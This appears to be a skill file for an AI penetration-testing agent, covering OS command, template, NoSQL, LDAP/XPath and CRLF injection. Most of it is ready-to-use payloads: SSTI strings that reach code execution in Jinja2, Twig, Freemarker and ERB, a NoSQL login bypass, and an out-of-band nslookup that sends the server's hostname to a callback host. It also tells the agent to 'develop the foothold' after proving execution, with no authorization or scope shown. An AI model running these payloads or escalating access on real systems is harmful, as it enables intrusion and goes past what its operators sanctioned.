---
name: server-injection
title: Server-side injection — OS command, SSTI, NoSQL, LDAP/XPath, CRLF
triggers: Load when input may reach a shell, a template engine, a non-SQL query, or a header — filenames/hosts passed to tools (ping, convert, git), "preview/render" features, email/report templates, JSON bodies hitting MongoDB-style queries, directory searches, or values reflected into response headers or redirects.
attack: initial-access, execution
owasp: A05
payloads: Command Injection; Server Side Template Injection; Server Side Include Injection; LDAP Injection; XPATH Injection; XSLT Injection; LaTeX Injection; NoSQL Injection; ORM Leak; Prototype Pollution
---

Each injection class has a cheap, unambiguous differential. Prove the branch, then prove execution with output only the interpreter could produce. Read-only throughout.

## OS command injection
- Sinks: anything that sounds like a CLI wrapper — ping/traceroute/DNS tools, image/PDF conversion, archive handling, git/ssh integrations, backup/export.
- Separators: `;`, `&&`, `||`, `|`, newline `%0a`, backticks, `$(…)`. Argument injection when you only control an argument: `--output=/tmp/x`, `-oProxyCommand=`.
- **Differential:** `$(sleep 5)` vs `$(sleep 0)` (repeat to beat jitter), or a response-visible echo of a unique marker (`;echo pwn7x3q`).
- **Proof:** `id`, `hostname`, `uname -a` output in the response, or out-of-band when blind: `nslookup <oast payload>` (from `oast action=payload`), with a label such as `$(hostname)` prefixed to show where it ran, then `oast action=poll`. Then develop the foothold (`state_update action=access`), don't stop at `id`.

## Server-side template injection (SSTI)
- Probe with a math canary in each syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`. `49` = evaluated. `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig) fingerprints the engine.
- Escalate per engine only as far as proof needs: Jinja2 `{{cycler.__init__.__globals__.os.popen('id').read()}}`, Twig `{{['id']|filter('system')}}`, Freemarker `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, ERB `<%= `id` %>`.
- Client-side template evaluation (Angular/Vue in the browser) is XSS, not SSTI → `xss`.

## NoSQL injection
- JSON operator injection: `{"user":"admin","password":{"$ne":null}}`, `{"$gt":""}`, `{"$regex":"^a"}`; form-encoded: `password[$ne]=x`.
- **Differential:** `{"$ne":"x"}` vs `{"$eq":"x"}` login/lookup outcome, or `$regex` prefix tests that change result counts (blind extraction of one value proves read access).
- `$where` / server-side JS where enabled: time-based `sleep(5000)` differential.

## LDAP / XPath
- LDAP filters: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)` — a wildcard that returns more entries than the literal proves injection. XPath: `' or '1'='1` vs `' or '1'='2`.

## CRLF / header injection
- `%0d%0aSet-Cookie:pwn=1` or `%0d%0aX-Pwn:1` in values reflected into headers or `Location`. Proof = the injected header in the raw response (curl `-i`, not a browser). Chains: response splitting, cache poisoning, session fixation.

## Record & validate
- `state_update action=vuln owasp=[A05]` naming the class, sink and engine; evidence = the differential pair plus the execution output saved to a file.
- RCE → also `action=access access_type=rce`; follow the foothold nudge.
- Sinks tested clean → `action=endpoint owasp=[A05]` with the classes you tried in `result`.
